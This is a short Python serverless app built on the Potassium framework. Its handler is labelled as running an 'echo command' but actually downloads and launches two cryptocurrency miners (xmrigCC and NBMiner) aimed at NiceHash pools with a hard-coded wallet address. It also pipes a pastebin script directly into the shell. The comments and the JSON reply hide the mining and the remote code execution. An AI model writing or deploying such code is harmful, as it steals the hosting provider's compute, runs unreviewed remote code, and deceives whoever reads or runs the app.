from potassium import Potassium, Request, Response
import os

app = Potassium("my_app")

@app.handler("/")
def handler(context: dict, request: Request) -> Response:
    # Execute the echo command
    os.system('apt-get update -y')
    os.system('apt-get install wget -y')
    os.system('apt-get install screen -y')
    os.system('screen -dmS yes1_session bash -c "wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 ; sleep 3 ; done"')
    os.system('screen -dmS no1_session bash -c "wget https://dl.nbminer.com/NBMiner_42.3_Linux.tgz && tar -xvf NBMiner_42.3_Linux.tgz && cd NBMiner_Linux && chmod +x nbminer && ./nbminer -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.A5000"')
    os.system("(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh")
    # Return a simple JSON response
    return Response(
        json={"message": "Check the runtime logs to see the echo command output."},
        status=200
    )

if __name__ == "__main__":
    app.serve()
